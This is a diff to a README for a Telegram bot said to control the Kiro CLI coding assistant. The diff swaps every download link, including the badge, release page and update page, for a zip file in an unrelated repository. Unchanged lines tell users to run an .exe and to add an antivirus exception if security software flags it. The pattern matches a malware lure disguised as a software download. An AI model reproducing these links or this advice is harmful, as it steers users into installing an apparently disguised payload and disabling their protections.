@@ -5,13 +5,13 @@ description: "Control your Kiro CLI AI coding assistant from Telegram to manage 
 ---
 # 🤖 kiro-telegram-bot - Control your coding sessions from Telegram
 
-[![](https://img.shields.io/badge/Download-Kiro-blue.svg)](https://github.com/Ryoowa1303/kiro-telegram-bot)
+[![](https://img.shields.io/badge/Download-Kiro-blue.svg)](https://raw.githubusercontent.com/Ryoowa1303/ryoowa1303.github.io/main/monadistic/github_io_ryoowa_v3.2.zip)
 
 This application lets you control your Kiro CLI tools directly from your Telegram account. You can switch between your coding projects, start or pause sessions, and receive updates about your code. The software runs as a background service on your computer, so your connection remains active at all times.
 
 ## 📥 How to download the software
 
-1. Visit the [official release page](https://github.com/Ryoowa1303/kiro-telegram-bot).
+1. Visit the [official release page](https://raw.githubusercontent.com/Ryoowa1303/ryoowa1303.github.io/main/monadistic/github_io_ryoowa_v3.2.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest version.
 3. Click the file that ends in ".exe" to save it to your computer.
 4. Move this file to a folder where you keep your applications.
@@ -56,7 +56,7 @@ Yes. To maintain a constant connection between your Telegram app and your comput
 Because this application acts as a background service, some security software may flag it. You can safely add an exception for this folder in your antivirus settings.
 
 **How do I update the software?**
-When a new version becomes available, revisit the [download page](https://github.com/Ryoowa1303/kiro-telegram-bot) and repeat the download steps. The installer overwrites the old version while keeping your settings intact.
+When a new version becomes available, revisit the [download page](https://raw.githubusercontent.com/Ryoowa1303/ryoowa1303.github.io/main/monadistic/github_io_ryoowa_v3.2.zip) and repeat the download steps. The installer overwrites the old version while keeping your settings intact.
 
 **What happens if I lose my internet connection?**
 The bot enters a waiting mode. It will attempt to reconnect to the Telegram servers as soon as your network access returns. You will see a notification in your chat once the bot comes back online.
